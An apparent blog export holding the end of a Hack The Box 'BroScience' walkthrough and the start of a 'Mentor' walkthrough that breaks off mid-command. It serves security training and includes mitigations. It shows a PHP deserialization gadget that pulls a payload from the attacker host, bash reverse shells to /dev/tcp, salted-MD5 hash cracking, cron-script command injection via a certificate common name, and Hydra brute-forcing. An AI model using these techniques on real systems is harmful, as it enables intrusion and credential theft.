1)];}echo 'https://broscience.htb/activate.php?code=' . $activation_code . \"\\n\";I ran the script and used the generated link$ php generateCode.phphttps://broscience.htb/activate.php?code=OqxSuRjhkh02FEDHXHtPeTLu5PJ8z2foRemote Code ExecutionI logged into the site with my activated user. I looked around, I could modify my account and add comments under exercises. I tried sending XSS and SSTI payloads, but it did not work.I kept looking at the source code. The file db_connect.php contained database credentials.&lt;?php$db_host = \"localhost\";$db_port = \"5432\";$db_name = \"broscience\";$db_user = \"dbuser\";$db_pass = \"REDACTED\";$db_salt = \"NaCl\";$db_conn = pg_connect(\"host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}\");if (!$db_conn) {    die(\"&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database\");}?&gt;I tried the found password to SSH as bill, but it was rejected.I looked further in the utils code and saw this code.function get_theme() {    if (isset($_SESSION['id'])) {        if (!isset($_COOKIE['user-prefs'])) {            $up_cookie = base64_encode(serialize(new UserPrefs()));            setcookie('user-prefs', $up_cookie);        } else {            $up_cookie = $_COOKIE['user-prefs'];        }        $up = unserialize(base64_decode($up_cookie));        return $up-&gt;theme;    } else {        return \"light\";    }}This code used PHP serialization to store and read information in the cookies.The UserPrefs class did not have much I could use to attack the server.class UserPrefs {    public $theme;    public function __construct($theme = \"light\") {\t\t$this-&gt;theme = $theme;    }}I could serialize a UserPrefs object on my machine. I would control the theme properties, but reading the code, this did not give me much.But I did not need to serialize a UserPrefs object. The code would unserialize anything I gave it. Reading further, I saw two interesting classes.class Avatar {    public $imgPath;    public function __construct($imgPath) {        $this-&gt;imgPath = $imgPath;    }    public function save($tmp) {        $f = fopen($this-&gt;imgPath, \"w\");        fwrite($f, file_get_contents($tmp));        fclose($f);    }}class AvatarInterface {    public $tmp;    public $imgPath;     public function __wakeup() {        $a = new Avatar($this-&gt;imgPath);        $a-&gt;save($this-&gt;tmp);    }}The __wakeup method is called when an object is unserialized. On waking up, the unserialize AvatarInterface object would create an Avatar object and call save on it. I could control the $tmp and $imgPath properties. So I could use that to read a file and save it where I wanted.I created a PHP script to generate the serialized code I needed.&lt;?phpclass Avatar {    public $imgPath;    public function __construct($imgPath) {        $this-&gt;imgPath = $imgPath;    }    public function save($tmp) {        $f = fopen($this-&gt;imgPath, \"w\");        fwrite($f, file_get_contents($tmp));        fclose($f);    }}class AvatarInterface {    public $tmp = 'http://10.10.14.2/rce';    public $imgPath = '/var/www/html/test.php';    public function __wakeup() {        $a = new Avatar($this-&gt;imgPath);        $a-&gt;save($this-&gt;tmp);    }}echo urlencode(base64_encode(serialize(new AvatarInterface()))) . \"\\n\";This created a serialized AvatarInterface that would read a file from my machine, and save its contents to /var/www/html/test.php on the server.I created the file to launch a reverse shell and started a web server on my machine.&lt;?php`bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1'`;I generated the cookie value and used it to set the user-prefs cookie in my browser.$ php createCookie.phpTzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyMToiaHR0cDovLzEwLjEwLjE0LjIvcmNlIjtzOjc6ImltZ1BhdGgiO3M6MjI6Ii92YXIvd3d3L2h0bWwvdGVzdC5waHAiO30%3DI opened the home page of the site and saw that it requested the rce file from my web server.Finally, I launched a netcat listener and navigated to https://broscience.htb/test.php.$ nc -klvnp 4444listening on [any] 4444 ...connect to [10.10.14.5] from (UNKNOWN) [10.10.11.195] 41862bash: cannot set terminal process group (834): Inappropriate ioctl for devicebash: no job control in this shellwww-data@broscience:/var/www/html$ lslsactivate.phpcomment.phpexercise.phpimagesincludesindex.phplogin.phplogout.phpregister.phpstylesswap_theme.phptest2.phpupdate_user.phpuser.phpGetting A UserI was on the server, but as www-data which can‚Äôt do much. I had some database credentials so I use them to see what the db contained.www-data@broscience:/var/www/html$ psql -U dbuser -W broscience -p5432 -hlocalhostPassword:psql (13.9 (Debian 13.9-0+deb11u1))SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)Type \"help\" for help.broscience=&gt; Select username, password From users;The users table contained usernames and hashed passwords.   username    |             password---------------+---------------------------------- administrator | 15657792073e8a843d4f91fc403454e1 bill          | 13edad4932da9dbb57d9cd15b66ed104 michael       | bd3dad50e2d578ecba87d5fa15ca5f85 john          | a7eed23a7be6fe0d765197b1027453fe dmytro        | 5d15340bded5b9395d5d14b9c21bc82bI remembered from reading the db_connect.php file that the passwords were ‚Äòsalted‚Äô with ‚ÄòNaCl‚Äô. And from the register code that the salt was put before the password, then hashed with md5.md5($db_salt . $_POST['password'])I saved the hashes in a file and used hashcat to crack them.$ cat hashes.txt   administrator:15657792073e8a843d4f91fc403454e1:NaClbill:13edad4932da9dbb57d9cd15b66ed104:NaClmichael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCljohn:a7eed23a7be6fe0d765197b1027453fe:NaCldmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl$ hashcat -a0 -m20 hashes.txt /usr/share/seclists/rockyou.txt --usernamehashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]==================================================================================================================================================* Device #1: pthread-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2869/5803 MB (1024 MB allocatable), 6MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Minimim salt length supported by kernel: 0Maximum salt length supported by kernel: 256Hashes: 5 digests; 5 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Early-Skip* Not-Iterated* Single-Salt* Raw-HashATTENTION! Pure (unoptimized) backend kernels selected.Pure kernels can crack longer passwords, but drastically reduce performance.If you want to switch to optimized kernels, append -O to your commandline.See the above message to find out about the exact limits.Watchdog: Temperature abort trigger set to 90cHost memory required for this attack: 1 MBDictionary cache hit:* Filename..: /usr/share/seclists/rockyou.txt* Passwords.: 14344384* Bytes.....: 139921497* Keyspace..: 1434438413edad4932da9dbb57d9cd15b66ed104:NaCl:REDACTED5d15340bded5b9395d5d14b9c21bc82b:NaCl:REDACTEDbd3dad50e2d578ecba87d5fa15ca5f85:NaCl:REDACTEDApproaching final keyspace - workload adjusted.Session..........: hashcatStatus...........: ExhaustedHash.Mode........: 20 (md5($salt.$pass))Hash.Target......: hashes.txtTime.Started.....: Sun Jan 29 17:53:33 2023 (3 secs)Time.Estimated...: Sun Jan 29 17:53:36 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/seclists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:  5515.0 kH/s (0.14ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 3/5 (60.00%) Digests (total), 3/5 (60.00%) Digests (new)Progress.........: 14344384/14344384 (100.00%)Rejected.........: 0/14344384 (0.00%)Restore.Point....: 14344384/14344384 (100.00%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: $HEX[21217365786d652121] -&gt; $HEX[042a0337c2a156616d6f732103]Hardware.Mon.#1..: Util: 32%Started: Sun Jan 29 17:53:11 2023Stopped: Sun Jan 29 17:53:37 2023$ hashcat -a0 -m20 hashes.txt /usr/share/seclists/rockyou.txt --username --showbill:13edad4932da9dbb57d9cd15b66ed104:NaCl:REDACTEDmichael:bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:REDACTEDdmytro:5d15340bded5b9395d5d14b9c21bc82b:NaCl:REDACTEDI used bill‚Äôs password to connect to the server and get the user flag.$ ssh bill@targetbill@target's password:Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Jan  2 04:45:21 2023 from 10.10.14.40bill@broscience:~$ cat user.txtREDACTEDCertificate RenewalI looked around the server. I found a script in /opt/renew_cert.sh. The script was looking for a certificate, and if it was expiring soon, it would read some information about it, generate a new one, and move it in bill‚Äôs home folder.#!/bin/bashif [ \"$#\" -ne 1 ] || [ $1 == \"-h\" ] || [ $1 == \"--help\" ] || [ $1 == \"help\" ]; then    echo \"Usage: $0 certificate.crt\";    exit 0;fiif [ -f $1 ]; then    openssl x509 -in $1 -noout -checkend 86400 &gt; /dev/null    if [ $? -eq 0 ]; then        echo \"No need to renew yet.\";        exit 1;    fi    subject=$(openssl x509 -in $1 -noout -subject | cut -d \"=\" -f2-)    country=$(echo $subject | grep -Eo 'C = .{2}')    state=$(echo $subject | grep -Eo 'ST = .*,')    locality=$(echo $subject | grep -Eo 'L = .*,')    organization=$(echo $subject | grep -Eo 'O = .*,')    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')    commonName=$(echo $subject | grep -Eo 'CN = .*,?')    emailAddress=$(openssl x509 -in $1 -noout -email)    country=${country:4}    state=$(echo ${state:5} | awk -F, '{print $1}')    locality=$(echo ${locality:3} | awk -F, '{print $1}')    organization=$(echo ${organization:4} | awk -F, '{print $1}')    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')    echo $subject;    echo \"\";    echo \"Country     =&gt; $country\";    echo \"State       =&gt; $state\";    echo \"Locality    =&gt; $locality\";    echo \"Org Name    =&gt; $organization\";    echo \"Org Unit    =&gt; $organizationUnit\";    echo \"Common Name =&gt; $commonName\";    echo \"Email       =&gt; $emailAddress\";    echo -e \"\\nGenerating certificate...\";    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;\"$country    $state    $locality    $organization    $organizationUnit    $commonName    $emailAddress    \" 2&gt;/dev/null    /bin/bash -c \"mv /tmp/temp.crt /home/bill/Certs/$commonName.crt\"else    echo \"File doesn't exist\"    exit 1;fiI thought I might be able to use some of the information it read from the original certificated to get code execution. But I had to find out how the script ran. I uploaded pspy to the server and ran it.2023/01/29 18:30:01 CMD: UID=0     PID=1462   | /bin/bash /root/cron.sh2023/01/29 18:30:01 CMD: UID=0     PID=1463   | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crtThe script was running as root, and reading the certificate in /home/bill/Certs/broscience.crt.I used the command in the script to generate certificates that expired in one day. I played with the different values it read from the certificate before generating a new one and found that I could get code execution in the common name when the file was moved.bill@broscience:/tmp/tmp.ML5bZVF2Ow$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout temp.key -out temp.crt -days 1 &lt;&lt;&lt;\"CAQCMTLsomeOrgUnitMyName\\`id\\`test@test.com\"Generating a RSA private key.++++................................................................................++++writing new private key to 'temp.key'-----You are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter '.', the field will be left blank.-----Country Name (2 letter code) [AU]:State or Province Name (full name) [Some-State]:Locality Name (eg, city) []:Organization Name (eg, company) [Internet Widgits Pty Ltd]:Organizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:Email Address []:bill@x509 -noout -text -in temp.crt | lessut temp.key -out temp.crt -days 1 &lt;&lt;&lt;\"CAbill@broscience:/tmp/tmp.ML5bZVF2Ow$ cp temp.crt /home/bill/Certs/broscience.crtbill@broscience:/tmp/tmp.ML5bZVF2Ow$ /opt/renew_cert.sh /home/bill/Certs/broscience.crtC = CA, ST = QC, L = MTL, O = someOrg, OU = Unit, CN = MyName`id`, emailAddress = \"test@test.com \"Country     =&gt; CAState       =&gt; QCLocality    =&gt; MTLOrg Name    =&gt; someOrgOrg Unit    =&gt; UnitCommon Name =&gt; MyName`id`Email       =&gt; test@test.comGenerating certificate...mv: target 'groups=1000(bill).crt' is not a directoryThe command failed, but I could see that my code was executed.I created a script to launch a reverse shell.bill@broscience:/tmp/tmp.ML5bZVF2Ow$ cat /tmp/tmp.ML5bZVF2Ow/rce.sh#!/bin/bashbash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1'Then I created a certificate that would trigger the execution of the script on renewal.bill@broscience:/tmp/tmp.ML5bZVF2Ow$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout temp.key -out temp.crt -days 1 &lt;&lt;&lt;\"CAQCMTLsomeOrgUnitMyName\\`/tmp/tmp.ML5bZVF2Ow/rce.sh\\`test@test.com\"bill@broscience:/tmp/tmp.ML5bZVF2Ow$ cp temp.crt /home/bill/Certs/broscience.crtI copied the script, launched a netcat listener, and waited for root to renew the certificate.$ nc -klvnp 4444listening on [any] 4444 ...connect to [10.10.14.2] from (UNKNOWN) [10.10.11.195] 54574bash: cannot set terminal process group (2910): Inappropriate ioctl for devicebash: no job control in this shellroot@broscience:~# cat /root/root.txtcat /root/root.txtREDACTEDMitigationsTo secure this application, the first step is to remove the img.php file. This file is there only to serve images that are already in the webroot. A direct link would work for that.The code that generates the activation code is vulnerable because it uses the time to seed the random number generation. The documentation to srand says that it‚Äôs not necessary to seed it, it‚Äôs already done automatically. By seeding it with the time, it makes it easy to predict.The biggest issue with the site was the unserialization of the cookie. Serialization allows executing code on serialization and unserialization. It should never be used on user data. The cookie was storing a single string for the theme. So it would be sufficient to just store the theme in the cookie. And then validate it against an allowed list of themes.Once on the server, getting the user was pretty easy. The passwords were stored in the database after being hashed with a very weak hashing algorithm. md5 should not be used anymore. They tried to use a salt, but the salt was the same for every user. Hashcat was able to go through all the passwords in rockyou in 26 seconds, in a small virtual machine. And then, the password found was reused in SSH.The last issue on the machine was the script that renew the certificate. This was running as root, using data provided by the user. It would have been safer to only act on files that were owned by root and that could not be modified by anyone else. And the arguments should have been escaped. According to this StackExchange response, using single quotes around the argument would be sufficient.$ echo \"$(id)\"uid=1000(kali) gid=1000(kali) groups=1000(kali)$ echo '$(id)'$(id)"
  },
  
  {
    "title": "Hack The Box - Mentor",
    "url": "/posts/HackTheBox-Walkthrough-Mentor/",
    "categories": "",
    "tags": "Walkthrough, Hacking, HackTheBox, Medium, Machine",
    "date": "2023-03-11 00:00:00 +0800",
    





    
    "snippet": "This machine took me a long time to own because I failed at basic enumeration. Most of the work to do this box was in finding the passwords laying around.  Room: Mentor  Difficulty: Medium  URL: ht...",
    "content": "This machine took me a long time to own because I failed at basic enumeration. Most of the work to do this box was in finding the passwords laying around.  Room: Mentor  Difficulty: Medium  URL: https://app.hackthebox.com/machines/Mentor  Author: kavigihanEnumerationI began by launching Rustscan to find open ports.$ rustscan -a target -- -A | tee rust.txt.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| || .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy           :: https://github.com/RustScan/RustScan : --------------------------------------üòµ https://admin.tryhackme.com[~] The config file is expected to be at \"/home/ehogue/.rustscan.toml\"[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.Open 10.10.11.193:22Open 10.10.11.193:80[~] Starting Script(s)[&gt;] Script to be run Some(\"nmap -vvv -p  \")[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 08:34 ESTNSE: Loaded 155 scripts for scanning....Scanned at 2023-02-25 08:34:10 EST for 8sPORT   STATE SERVICE REASON  VERSION22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=|   256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv80/tcp open  http    syn-ack Apache httpd 2.4.52|_http-title: Did not follow redirect to http://mentorquotes.htb/| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel...Nmap done: 1 IP address (1 host up) scanned in 8.71 secondsIt found two ports:  22 (SSH)  80 (HTTP)Nmap showed that the HTTP server was redirecting to ‚Äòhttp://mentorquotes.htb/‚Äô so I added the domain to my hosts file.I ran Feroxbuster on the site.$ feroxbuster -u http://mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ü§ì                 ver: 2.7.3‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ  Target Url            ‚îÇ http://mentorquotes.htb/ üöÄ  Threads               ‚îÇ 50 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] üí•  Timeout (secs)        ‚îÇ 7 ü¶°  User-Agent            ‚îÇ feroxbuster/2.7.3 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml üíæ  Output File           ‚îÇ ferox.txt üèÅ  HTTP methods          ‚îÇ [GET] üîÉ  Recursion Depth       ‚îÇ 4‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ200      GET      167l      621w     5506c http://mentorquotes.htb/403      GET        9l       28w      281c http://mentorquotes.htb/server-status[####################] - 3m     63088/63088   0s      found:2       errors:31[####################] - 3m     63088/63088   291/s   http://mentorquotes.htb/It did not find anything of interest. I used wfuzz to look for subdomains.$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 26 -H \"Host:FUZZ.mentorquotes.htb\" \"http://mentorquotes.htb\" /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://mentorquotes.htb/Total requests: 5000=====================================================================ID           Response   Lines    Word       Chars       Payload=====================================================================000000051:   404        0 L      2 W        22 Ch       \"api\"000002700:   400        10 L     35 W       308 Ch      \"m.\"000002795:   400        10 L     35 W       308 Ch      \"ns2.cl.bellsouth.net.\"000002885:   400        10 L     35 W       308 Ch      \"ns2.viviotech.net.\"000002883:   400        10 L     35 W       308 Ch      \"ns1.viviotech.net.\"000003050:   400        10 L     35 W       308 Ch      \"ns3.cl.bellsouth.net.\"000004083:   400        10 L     35 W       308 Ch      \"quatro.oweb.com.\"000004081:   400        10 L     35 W       308 Ch      \"ferrari.fortwayne.com.\"000004082:   400        10 L     35 W       308 Ch      \"jordan.fortwayne.com.\"Total time: 0Processed Requests: 5000Filtered Requests: 4991Requests/sec.: 0I added ‚Äòapi.memtorquotes.htb‚Äô to my hosts file and scanned it.$ feroxbuster -u http://api.mentorquotes.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o api_ferox.txt -n ___  ___  __   __     __      __         __   ___|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___by Ben \"epi\" Risher ü§ì                 ver: 2.7.3‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üéØ  Target Url            ‚îÇ http://api.mentorquotes.htb/ üöÄ  Threads               ‚îÇ 50 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt üëå  Status Codes          ‚îÇ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] üí•  Timeout (secs)        ‚îÇ 7 ü¶°  User-Agent            ‚îÇ feroxbuster/2.7.3 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml üíæ  Output File           ‚îÇ api_ferox.txt üèÅ  HTTP methods          ‚îÇ [GET] üö´  Do Not Recurse        ‚îÇ true‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ307      GET        0l        0w        0c http://api.mentorquotes.htb/admin =&gt; http://api.mentorquotes.htb/admin/200      GET       31l       62w      969c http://api.mentorquotes.htb/docs307      GET        0l        0w        0c http://api.mentorquotes.htb/users =&gt; http://api.mentorquotes.htb/users/307      GET        0l        0w        0c http://api.mentorquotes.htb/quotes =&gt; http://api.mentorquotes.htb/quotes/403      GET        9l       28w      285c http://api.mentorquotes.htb/server-status[####################] - 1m     63088/63088   0s      found:5       errors:59[####################] - 1m     63088/63088   654/s   http://api.mentorquotes.htb/It found ‚Äòapi.mentorquotes.htb‚Äô.WebsiteI opened a browser to look at the website.It was a very simple website that showed some quotes. It appeared to have only one page. I looked at the source, and the requests it made. I did not see anything to exploit.APII started looking at the API. Feroxbuster showed me that there was something on ‚Äò/docs‚Äô, so I looked at this first.It contained the Swagger documentation of the API. The API was simple, having endpoints to authenticate, manage users, and manage quotes. Ferobuster also found an ‚Äò/admin/‚Äô endpoint that was not documented.The API had an endpoint to signup. I used it to create a user.POST /auth/signup HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-type: application/jsonContent-Length: 83{  \"email\": \"eric@test.htb\",  \"username\": \"test1\",  \"password\": \"12345678\"}It worked.HTTP/1.1 201 CreatedDate: Sat, 25 Feb 2023 17:53:59 GMTServer: uvicorncontent-length: 51content-type: application/jsonKeep-Alive: timeout=5, max=100Connection: Keep-Alive{  \"id\": 4,  \"email\": \"eric@test.htb\",  \"username\": \"test1\"}I then logged in as the new user.POST /auth/login HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-type: application/jsonContent-Length: 83{  \"email\": \"eric@test.htb\",  \"username\": \"test1\",  \"password\": \"12345678\"}HTTP/1.1 200 OKDate: Sat, 25 Feb 2023 18:00:43 GMTServer: uvicorncontent-length: 142content-type: application/jsonKeep-Alive: timeout=5, max=100Connection: Keep-Alive\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJlcmljQHRlc3QuaHRiIn0.6EX5kf4IJxcw2QpZXGm6UZhSHVUtiVrUBvq65iqARxM\"It gave me a JWT. I added it to my requests and tried the different API endpoints. I was able to get the quotes, but every other call failed.{  \"detail\": \"Only admin users can access this resource\"}The documentation page contained an email, I tried to use it to create a new user.POST /auth/signup HTTP/1.1Host: api.mentorquotes.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cacheContent-type: application/jsonContent-Length: 124{  \"email\": \"james@mentorquotes.htb\",  \"username\": \"james\",  \"password\": \"12345678\",  \"admin\": 1,  \"isAdmin\": 1}This told me that the user already existed.{  \"detail\": \"User already exists! \"}I tried using Hydra to brute force the password for james. And I tried to brute-force the key to sign the JWT with hashcat. They both failed.$ hydra -l james -P /usr/share/seclists/rockyou.txt -u -e snr  -m \"/auth/login:{\\\"email\\\"\\:\\\"james@mentorquotes.htb\\\",\\\"username\\\"\\:\\\"^USER^\\\",\\\"password\\\"\\:\\\"^PASS^\\\"}:200 OK:H=Content-Type: application/json\" api.mentorquotes.htb http-post-form$ hashcat -a 0 -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzICIsImVtYWlsIjoiamFtZXNAbWVudG9ycXVvdGVzLmh0YiJ9._Oh3hzsiflgbMWcFjZGF33bxTCt263o0vl5m6hqFqaU /usr/share/seclists/rockyou.txtI lost a lot of hours trying to break the API. Eventually, I looked for a hint on the HTB forum and saw something about UDP. I really need to start scanning UDP all the time.$ sudo nmap -sU target -oN nampUdp.txt[sudo] password for ehogue:Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 17:17 ESTStats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing UDP ScanNmap scan report for target (10.10.11.193)Host is up (0.030s latency).Not shown: 998 closed udp ports (port-unreach)PORT    STATE         SERVICE68/udp  open|filtered dhcpc161/udp open          snmpNmap done: 1 IP address (1 host up) scanned in 1013.42 secondsSimple Network Management Protocol (SNMP) was open. I tried scanning it with multiple tools. But I did not find anything of interest.I used hydra to scan for other community strings. But it kept on finding only ‚Äòpublic‚Äô.$ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.htb snmpHydra v9.4 (c) 2022 by van Hauser/THC 